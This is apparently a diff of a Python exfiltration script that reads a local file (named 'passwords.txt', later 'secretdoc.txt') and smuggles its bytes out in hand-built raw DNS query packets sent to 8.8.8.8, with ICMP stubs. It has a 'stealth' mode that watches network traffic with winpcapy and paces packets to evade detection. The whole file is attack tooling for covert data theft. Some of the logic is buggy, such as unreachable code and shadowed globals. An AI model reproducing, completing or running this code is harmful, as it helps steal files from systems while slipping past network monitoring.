@@ -3,7 +3,6 @@ import base64
 import binascii
 import ctypes
 import math
-import packettypes
 import platform
 import random
 import socket
@@ -14,7 +13,6 @@ import threading
 import time
 
 from ctypes import *
-from packettypes import * 
 from sys import argv
 from winpcapy import *
 
@@ -23,17 +21,16 @@ u_int       = c_int
 u_short     = c_ushort
 
 chunkLength         = 20
-currentFilePath     = "passwords.txt"
+completedTransfer   = False
+currentFilePath     = "secretdoc.txt"
 exfilBytes          = b''
 ICMP_ECHO_REPLY     = 0
 ICMP_ECHO_REQUEST   = 8
-startByte           = 0
-
 intervalLength      = 5
+startByte           = 0
 updatedPPI          = 10
 
 DNS_REQUEST     = 0
-
 ICMP_PROTOCOL   = socket.getprotobyname('icmp')
 UDP_PROTOCOL    = socket.getprotobyname('udp')
 
@@ -45,7 +42,6 @@ dnsOnly     = False
 mixedOnly   = False
 
 monitorThread = None
-
 
 class ICMPPacket:
     def __init__(self, type, code):
@@ -66,32 +62,41 @@ class ICMPPacket:
         return
     
 class DNSPacket:
-    def __init__(self, id, code):
-        self.type = type
-        self.code = code
+    def __init__(self, data):
+        self.data = data
         self.QR = 0
 
     def computeChecksum():
         return
         
-    def getHeader(self):
+    def getHeader(self, length):
         # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
         # All flags are 0 so we can just use an unsigned short (16 bytes) of 0
         # DNS uses UDP so create UDP header first
 
         packetId = int((id(self) * random.random()) % 65535)
         
-        udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(8 + 18 + 4*math.ceil(chunkLength/3)), 0)
+        #udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(8 + 18 + 4*math.ceil(chunkLength/3)), 0)
+        udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(length), 0)
         dnsHeader = struct.pack("HHHHHH", socket.htons(packetId), 0, socket.htons(1), 0, 0, 0)
         return udpHeader + dnsHeader
 
-    def fill():
-        # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
-        
-        return
+    def construct(self):
+        # Add hostname terminating byte and final two options
+        end = struct.pack("HH", socket.htons(1), socket.htons(1))
+        length = len(self.data) + len(end) + 20
+        header = self.getHeader(length)
 
+        print("Total packet length: %d" % length)
+        return header + self.data + end
 
 def main(q):
+    global stealthMode
+    global fastMode
+    global icmpOnly
+    global dnsOnly
+    global mixedOnly
+
     parser = argparse.ArgumentParser(description="Set options for exfiltration")
     parser.add_argument('-s', dest="stealth", action="store_true", default=False, required=False)
     parser.add_argument('-f', dest="fast", action="store_true", default=False, required=False)
@@ -117,7 +122,6 @@ def main(q):
     dnsOnly     = args.dns
     mixedOnly   = args.mixed
 
-    print("Flags set, running...")
     init()
 
     return
@@ -126,57 +130,77 @@ def main(q):
 def init():
     global exfilBytes
     startByte = 0
-    exfilBytes = readFile("passwords.txt", "rb")
-    monitorThread = threading.Thread(None, monitorNetwork)
-    monitorThread.start();
+    exfilBytes = readFile(currentFilePath, "rb")
+
+    if stealthMode:     
+        monitorThread = threading.Thread(None, monitorNetwork)
+        monitorThread.start()
     loop()
 
 def loop():
 
-    k = 48 # Constant of proportionality between delay and ppi
-    localPPI = updatedPPI
-    delay = k / localPPI
-
+    if fastMode:
+        k = 48 # Constant of proportionality between delay and ppi
+        localPPI = updatedPPI
+        delay = k / localPPI
 
     # While the whole file hasn't be exfiltrated
     while startByte < (len(exfilBytes) - 1):
-        print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
-        # If the monitor has updated the PPI value, then update the delay between packets
-        if localPPI != updatedPPI:
-            print("Updating delay")
-            localPPI = updatedPPI
-            delay = k/localPPI
-            print("New delay: %f" % (delay))        
+        if fastMode:       
+            print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
+            # If the monitor has updated the PPI value, then update the delay between packets
+            if localPPI != updatedPPI:
+                print("Updating delay")
+                localPPI = updatedPPI
+                delay = k/localPPI
+                print("New delay: %f" % (delay))        
 
         # Send next chunk
-        print("Sending next...")
         sendNext("8.8.8.8", UDP_PROTOCOL)
         print("Packet sent")
 
-        time.sleep(delay)
+        if fastMode:
+            time.sleep(delay)
     return
+
+    completedTransfer = True
     
 def createICMPPacket():
     icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0)
     icmpHeader = icmpPacket.getHeader()
     data = getNextChunk(startByte, chunkLength)
     
-    return icmpHeader + data
+    return icmpHeader #+ data
 
 def createDNSPacket():
-    dnsPacket = DNSPacket(0, 0)
-    dnsUdpHeader = dnsPacket.getHeader()
-    data = getNextChunk(startByte, chunkLength)
-    data = base64.b64encode(data)
-    #print(data)
-    
-    # Maximum length of label is 63 characters, so keep chunkLength below this. Unless you seperate into multiple labels
-    queryHostname = len(data).to_bytes(1, "little") + data + (0).to_bytes(1, "big")
-    #print(socket.htons(len(questionDomain)))
+    queryHostname = b''
 
-    # Add hostname terminating byte and final two options
-    end = struct.pack("HH", socket.htons(1), socket.htons(1))
-    return dnsUdpHeader + queryHostname + end
+    if fastMode == True:
+        print("Creating fast mode DNS packet")
+        # (62).(62).(62).(62)
+        for i in range(0, 4):
+            chunkLength = 62
+            data = getNextChunk(startByte, chunkLength)
+            #data = base64.b32encode(data)
+            data = len(data).to_bytes(1, "little") + data
+            queryHostname += data
+
+        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name
+    else:
+        print("Hey")
+        # Adjust chunk length accordingly
+        for i in range(0, 4):
+            chunkLength = math.floor(random.random() * 30)
+            data = getNextChunk(startByte, chunkLength)
+            #data = base64.b32encode(data)
+            data = len(data).to_bytes(1, "little") + data
+            queryHostname += data
+
+        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name
+
+    dnsPacket = DNSPacket(queryHostname).construct()
+
+    return dnsPacket
 
 def stringToDNSQuery(s):
     labels = s.split(".")
@@ -236,14 +260,6 @@ def readFile(name, mode):
     return fileBytes
 
 def sendNext(dest_addr, code, timeout=1):
-    """
-    Sends one ping to the given "dest_addr" which can be an ip or hostname.
-    "timeout" can be any integer or float except negatives and zero.
-
-    Returns either the delay (in seconds) or None on timeout and an invalid
-    address, respectively.
-
-    """
     try:
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, code)
     except socket.error as e:
@@ -268,7 +284,6 @@ def sendNext(dest_addr, code, timeout=1):
     my_socket.close()
     #return delay
     return
-
 
 class ip_address(Structure):
     _fields_ = [("byte1", u_char),
@@ -296,12 +311,6 @@ class udp_header(BigEndianStructure):
                 ("dport", u_short),
                 ("len", u_short),
                 ("crc", u_short)]
-
-
-
-
-
-
 
 pktCount = 0
 intervalTime = 10
@@ -381,8 +390,7 @@ def monitorNetwork():
     pcap_freealldevs(alldevs)
     # Start capturing, set large packet capture size because we want to stop before this is reached
 
-    while 1:
-
+    while not completedTransfer:
         print("Starting capture")
         start = time.clock()
         pktCount = 0
